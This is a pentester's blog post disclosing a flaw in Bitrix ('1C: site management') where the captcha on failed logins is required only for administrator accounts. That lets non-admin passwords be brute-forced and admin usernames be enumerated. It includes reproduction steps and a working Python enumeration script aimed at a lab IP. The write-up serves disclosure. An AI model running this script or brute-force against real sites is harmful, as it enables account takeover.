=== Content from justrealstag.medium.com_a57459e3_20250119_121432.html ===
[Open in app](https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2F98933a97e0e6&%7Efeature=LoOpenInAppButton&%7Echannel=ShowPostUnderUser&source=---top_nav_layout_nav----------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Fjustrealstag.medium.com%2Fuser-enumeration-improper-restriction-of-excessive-authentication-attempts-in-bitrix-98933a97e0e6&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

[Write](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav-----------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Fjustrealstag.medium.com%2Fuser-enumeration-improper-restriction-of-excessive-authentication-attempts-in-bitrix-98933a97e0e6&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

![](https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png)
# User enumeration & Improper Restriction of Excessive Authentication Attempts in Bitrix

[![justSTAG](https://miro.medium.com/v2/resize:fill:88:88/1*aUu1Iz2dkwC5UPaeirzHgw.png)](/?source=post_page---byline--98933a97e0e6--------------------------------)

[justSTAG](/?source=post_page---byline--98933a97e0e6--------------------------------)

·

[Follow](https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fuser%2F2a9e98251e30&operation=register&redirect=https%3A%2F%2Fjustrealstag.medium.com%2Fuser-enumeration-improper-restriction-of-excessive-authentication-attempts-in-bitrix-98933a97e0e6&user=justSTAG&userId=2a9e98251e30&source=post_page-2a9e98251e30--byline--98933a97e0e6---------------------post_header-----------)

Oct 22, 2020

--

Listen

Share

Vulnerability description:

There is an improper restriction of excessive authentication attempts in the latest version of the application “1C: site management”. It allows to brute passwords for accounts not in the “administrator” group. Moreover it allows to enumerate users who are in the “administrator” group.

Step-by-step:

There are 3 users in the system: **admin**, **stag**, **root**. User **admin** is the default user and he is in the “administrator” group. User **stag** has the same privileges as **admin**. User **root** is in all groups except the “administrator” group.

![]()

List of users

![]()

stag’s groups

![]()

root’s groups

If you send multiple times incorrect credentials for users **admin** and **stag,** the server will request you to fill the captcha. However, for user **root** will not request the captcha, which allows to bruteforce password. The response with length 753 means that server did not request the captcha. Response with length 802 means that server requested the captcha.

![]()

Attempts to brute the password for admin

![]()

Attempts to brute the password for stag

![]()

Attempts to brute the password for root

![]()

Successful password matching

Due to the fact that, the captcha is not required if user does not exist or isn’t in the “administrator” group we can enumerate all users in the “administrator” group. There is python script for admin enumeration:

> *import requests*
>
> *f = open(“users.txt”,”r”)
> for line in f:
> for i in range(1, 5):
> r = requests.post(‘http://192.168.0.188/bitrix/admin/index.php?login=yes', data = {‘AUTH\_FORM’:’Y’,’TYPE’:’AUTH’,’USER\_LOGIN’:line.strip(‘\n’), ‘USER\_PASSWORD’:’not\_valid\_pass’,’Login’:’’,’captcha\_sid’:’’,’captcha\_word’:’’,’sessid’:’’})
> if str(r.content).find(‘CAPTCHA\_CODE’) > 0:
> print(“Admin found: “ + str(line))
> f.close()*

Content of file user.txt:

> *root
> admin
> stag
> fakeuser*

Output:

> *Admin found: admin*
>
> *Admin found: stag*

[Cve](https://medium.com/tag/cve?source=post_page-----98933a97e0e6--------------------------------)[Bitrix](https://medium.com/tag/bitrix?source=post_page-----98933a97e0e6--------------------------------)

--

--

[![justSTAG](https://miro.medium.com/v2/resize:fill:96:96/1*aUu1Iz2dkwC5UPaeirzHgw.png)](/?source=post_page---post_author_info--98933a97e0e6--------------------------------)[![justSTAG](https://miro.medium.com/v2/resize:fill:128:128/1*aUu1Iz2dkwC5UPaeirzHgw.png)](/?source=post_page---post_author_info--98933a97e0e6--------------------------------)Follow[## Written by justSTAG](/?source=post_page---post_author_info--98933a97e0e6--------------------------------)[1 Follower](/followers?source=post_page---post_author_info--98933a97e0e6--------------------------------)·[1 Following](/following?source=post_page---post_author_info--98933a97e0e6--------------------------------)

pentester. follow me: <https://twitter.com/justrealSTAG>

Follow
## No responses yet

[Help](https://help.medium.com/hc/en-us?source=post_page-----98933a97e0e6--------------------------------)[Status](https://medium.statuspage.io/?source=post_page-----98933a97e0e6--------------------------------)[About](https://medium.com/about?autoplay=1&source=post_page-----98933a97e0e6--------------------------------)[Careers](https://medium.com/jobs-at-medium/work-at-medium-959d1a85284e?source=post_page-----98933a97e0e6--------------------------------)[Press](pressinquiries%40medium.com?source=post_page-----98933a97e0e6--------------------------------)[Blog](https://blog.medium.com/?source=post_page-----98933a97e0e6--------------------------------)[Privacy](https://policy.medium.com/medium-privacy-policy-f03bf92035c9?source=post_page-----98933a97e0e6--------------------------------)[Terms](https://policy.medium.com/medium-terms-of-service-9db0094a1e0f?source=post_page-----98933a97e0e6--------------------------------)[Text to speech](https://speechify.com/medium?source=post_page-----98933a97e0e6--------------------------------)[Teams](https://medium.com/business?source=post_page-----98933a97e0e6--------------------------------)


